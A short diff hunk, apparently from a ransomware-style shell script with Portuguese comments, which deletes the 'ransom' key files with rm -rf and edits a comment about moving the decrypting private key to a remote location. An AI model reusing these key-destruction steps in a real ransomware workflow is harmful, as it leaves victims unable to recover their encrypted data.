@@ -40,4 +40,4 @@ rm -rf chave.key
 rm -rf resgate-pub.pem
 
 # opcional: mover para local seguro remoto a chave privada que decripta a chave de resgate
-#mv resgate.pem /home/vergani/
+# mv resgate.pem /local_remoto
